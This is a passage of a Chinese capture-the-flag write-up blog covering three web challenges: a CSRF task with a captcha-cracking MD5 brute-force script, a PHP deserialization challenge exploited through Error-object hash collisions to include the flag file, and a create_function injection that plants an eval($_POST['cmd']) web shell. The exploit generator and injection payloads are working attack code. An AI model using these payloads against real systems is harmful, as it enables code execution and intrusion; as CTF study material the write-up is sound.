+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218002000777.png" alt="image-20250218002000777"></p>
+<p>解释一下第一个exp的那段js代码</p>
+<p>**<code>history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;);</code>**：</p>
+<ul>
+<li><p><strong><code>history</code> 对象</strong>：这是浏览器提供的一个 API，允许你操控浏览器的历史记录。开发者可以使用它来添加、修改或删除历史记录条目。</p>
+</li>
+<li><p><code>pushState()</code> 方法</p>
+<p>：这个方法用于将一个新的状态记录到浏览器的历史记录栈中。它有三个参数：</p>
+<ul>
+<li><strong>第一个参数</strong>（<code>&#39;&#39;</code>）：表示状态对象，这里是一个空字符串，通常可以用来存储与状态相关的数据。</li>
+<li><strong>第二个参数</strong>（<code>&#39;&#39;</code>）：表示标题，这里也是一个空字符串。大多数浏览器目前会忽略这个参数。</li>
+<li><strong>第三个参数</strong>（<code>&#39;/&#39;</code>）：表示新的 URL。这会改变浏览器地址栏中显示的 URL，但不会导致页面重新加载。在这个例子中，URL 被设置为根路径 <code>&#39;/&#39;</code>。</li>
+</ul>
+</li>
+</ul>
+<p>说白了这里将当前页面的URL设置为’&#x2F;‘但不会引起页面刷新。是一种掩盖我们攻击的时候提交恶意请求的实际URL</p>
+<p>**<code>document.forms[0].submit();</code>**：</p>
+<ul>
+<li>**<code>document.forms</code>**：这是一个包含文档中所有表单的集合，<code>document.forms[0]</code> 获取第一个表单元素（在这个例子中是 <code>&lt;form&gt;</code> 标签）。</li>
+<li><strong><code>.submit()</code> 方法</strong>：这是一个 JavaScript 方法，用于程序matically 提交表单。调用这个方法时，浏览器会自动执行表单的提交操作，发送表单数据到指定的 <code>action</code> URL。</li>
+</ul>
+<p>上传报告的地方可以上传，但是需要爆破验证码</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218002143051.png" alt="image-20250218002143051"></p>
+<h2 id="贴个MD5截断加密的解密脚本"><a href="#贴个MD5截断加密的解密脚本" class="headerlink" title="贴个MD5截断加密的解密脚本"></a>贴个MD5截断加密的解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env/python</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6fb05&#x27;</span>      <span class="comment">#已知的md5明文</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findCode</span>(<span class="params">code</span>):</span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])</span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">5</span>] == knownMd5:</span><br><span class="line">            <span class="built_in">print</span>(code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.<span class="built_in">map</span>(findCode, <span class="built_in">list</span>)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218002817953.png" alt="image-20250218002817953"></p>
+<p>解密出来后在自己的web网站目录下放一个CSRF页面然后提交报告就可以了，我是放在我的远程服务器里头的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">报告主题:BUG</span><br><span class="line"></span><br><span class="line">验证码:爆破出来的</span><br><span class="line"></span><br><span class="line">报告内容:http://服务器IP/1.html</span><br></pre></td></tr></table></figure>
+
+<p>其实本来是可以出来的，但是不知道为啥buuctf的这道题的环境可能有问题一直出不来，所以了解思路就可以了</p>
+<h1 id="Greatphp"><a href="#Greatphp" class="headerlink" title="Greatphp"></a>Greatphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化的题目，只有一个wakeup方法里面的eval函数可以使用，看php版本是7.2.25，先分析一下里面的if语句</p>
+<p>1.需要让这两个成员变量不相等且md5值和sha1值相等</p>
+<p>2.绕过正则匹配，匹配字符为<code>&#39;&lt;?php&#39;,左右括号,单引号,双引号</code></p>
+<p>本来以为是一个正常的php绕过，但是强碰撞去绕过md5验证的话很难传入我们的rce危险函数</p>
+<p>在类里，无法用数组进行md5绕过，然后学到一个新姿势就是用原生类进行绕过</p>
+<p><strong>这里我们可以使用原生类Error或者Exception，只不过 Exception 类适用于PHP 5，7和8，而 Error 只适用于 PHP 7和8。</strong></p>
+<h2 id="Exception原生类"><a href="#Exception原生类" class="headerlink" title="Exception原生类"></a>Exception原生类</h2><p>(PHP 5, PHP 7, PHP 8)</p>
+<p><strong>Exception</strong>是所有用户级异常的基类。</p>
+<p>关于类的摘要</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163230150.png" alt="image-20250218163230150"></p>
+<p>属性:</p>
+<ul>
+<li><p>message</p>
+<p>异常消息内容</p>
+</li>
+<li><p>code</p>
+<p>异常代码</p>
+</li>
+<li><p>file</p>
+<p>抛出异常的文件名</p>
+</li>
+<li><p>line</p>
+<p>抛出异常在该文件中的行号</p>
+</li>
+<li><p>previous</p>
+<p>之前抛出的异常</p>
+</li>
+<li><p>string</p>
+<p>字符串形式的堆栈跟踪</p>
+</li>
+<li><p>trace</p>
+<p>数组形式的堆栈跟踪</p>
+</li>
+</ul>
+<p>各种方法的解释</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163448507.png" alt="image-20250218163448507"></p>
+<h2 id="Error原生类"><a href="#Error原生类" class="headerlink" title="Error原生类"></a>Error原生类</h2><p>(PHP 7, PHP 8)</p>
+<p><strong>Error</strong> 是所有PHP内部错误类的基类。</p>
+<p>关于类的摘要</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163346610.png" alt="image-20250218163346610"></p>
+<p>属性</p>
+<ul>
+<li><p>message</p>
+<p>错误消息内容</p>
+</li>
+<li><p>code</p>
+<p>错误代码</p>
+</li>
+<li><p>file</p>
+<p>抛出错误的文件名</p>
+</li>
+<li><p>line</p>
+<p>抛出错误的行数</p>
+</li>
+<li><p>previous</p>
+<p>之前抛出的异常</p>
+</li>
+<li><p>string</p>
+<p>字符串形式的堆栈跟踪</p>
+</li>
+<li><p>trace</p>
+<p>数组形式的堆栈跟踪</p>
+</li>
+</ul>
+<p>各种方法的解释</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163427394.png" alt="image-20250218163427394"></p>
+<p>接下来我们拿Error类在本地做一下测试进行讲解，Exception类和这个大差不差</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;不相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;md5相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;sha1相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">Error: payload in E:\vscode\profiles\1.php:2</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;Error: payload in E:\vscode\profiles\1.php:3</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;不相等</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到是成功满足了不相等的条件的，</p>
+<p>在 PHP 中，<code>$a</code> 和 <code>$b</code> 是两个不同的对象实例，尽管它们的构造函数接收的参数相同（即都为 <code>&quot;payload&quot;</code>），但它们的错误代码不同（<code>$a</code> 的错误代码为 <code>1</code>，而 <code>$b</code> 的错误代码为 <code>2</code>）。</p>
+<p>在 PHP 中，当您比较两个对象时，使用 <code>!=</code> 或 <code>!==</code> 运算符会比较对象的实例</p>
+<ol>
+<li><strong>引用比较</strong>：如果两个对象引用的是同一个实例（即它们是同一个对象），那么它们是相等的。</li>
+<li><strong>内容比较</strong>：如果两个对象是不同的实例（即它们是不同的对象），即使它们的属性具有相同的值，PHP 仍然会认为它们是不相等的</li>
+</ol>
+<p>因此，这两个对象被认为是不相等的。但是后面两个条件没满足，没满足md5的验证。这时候我们如果设置为同一行呢</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;不相等\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;md5相等\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;sha1相等\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Error: payload in E:\vscode\profiles\1.php:2</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"><span class="comment">Error: payload in E:\vscode\profiles\1.php:2</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"><span class="comment">不相等</span></span><br><span class="line"><span class="comment">md5相等</span></span><br><span class="line"><span class="comment">sha1相等</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候他们的md5和sha1是一样的,且他们的值是不一样的，因为md5和sha1比较的是</p>
+<p><code>Error: payload in E:\vscode\profiles\1.php:2 Stack trace: #0 &#123;main&#125;</code></p>
+<p>由于它们在同一行中被执行，若在此行代码中发生错误，错误指向的行数仅会标记为当前的行，即行号 2，这时候他们的内容完全相等，所以他们的md5值也会相等</p>
+<p>理清楚之后我们就开始打吧</p>
+<p>因为eval执行带有完整标签的语句需要先闭合，就类似于将字符串当成代码写入到源码中。</p>
+<p>由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接<code>include &quot;/flag&quot;</code>将flag包含进来即可；由于过滤了引号，于是在这里进行取反，这样解码后就自动是<strong>字符串</strong>，无需再加双引号或单引号。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&lt;?&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="FighterFightsInvincibly"><a href="#FighterFightsInvincibly" class="headerlink" title="FighterFightsInvincibly"></a>FighterFightsInvincibly</h1><p>源码中有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $_REQUEST[&#x27;fighter&#x27;]($_REQUEST[&#x27;fights&#x27;],$_REQUEST[&#x27;invincibly&#x27;]); --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个格式很像是<strong>变量函数</strong>的格式</p>
+<ul>
+<li>在PHP中，如果一个变量名后跟括号，PHP会尝试将该变量的值作为函数名来调用。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名(形参1,形参2);</span><br></pre></td></tr></table></figure>
+
+<p>一开始传入?fighter&#x3D;system&amp;fights&#x3D;whoami&amp;invincibly&#x3D;构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;whoami&quot;, &quot;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>但是没看到执行</p>
+<p>还有一个思路就是利用creat_function</p>
+<h2 id="creat-function-函数"><a href="#creat-function-函数" class="headerlink" title="creat_function()函数"></a>creat_function()函数</h2><p>create_function()主要用来通过执行代码字符串创建动态函数</p>
+<p>本函数已自 PHP 7.2.0 起被<em>废弃</em>，并自 PHP 8.0.0 起被<em>移除</em>。</p>
+<p>基本格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args, string $code): string</span><br></pre></td></tr></table></figure>
+
+<p>官方的例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newfunc</span>(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br></pre></td></tr></table></figure>
+
+<p>其实构造出来的函数是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们如何利用这个函数呢？在web目录下写一个1.php做测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br><span class="line"><span class="variable">$f1</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时如果我们传入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str2</span>=<span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那么构造出来的结果就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324201553670.png" alt="image-20250324201553670"></p>
+<p>但是如果我们传入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str2</span> = <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<p>那么构造出来的结果就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324201642213.png" alt="image-20250324201642213"></p>
+<p>说明是可以进行代码执行的，那我们回到题目中去构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fighter=create_function&amp;fights=&amp;invincibly=;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
+
+<p>页面上没有但是在源码中看到了内容</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324202105259.png" alt="image-20250324202105259"></p>
+<p>需要绕过disable_function，那我们写eval然后蚁剑连</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fighter=create_function&amp;fights=&amp;invincibly=;&#125;eval($_POST[&#x27;cmd&#x27;]);/*</span><br></pre></td></tr></table></figure>
+
+<p>连上后绕过disable_function</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324203657554.png" alt="image-20250324203657554"></p>
+<p>但是这里好像flag少了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
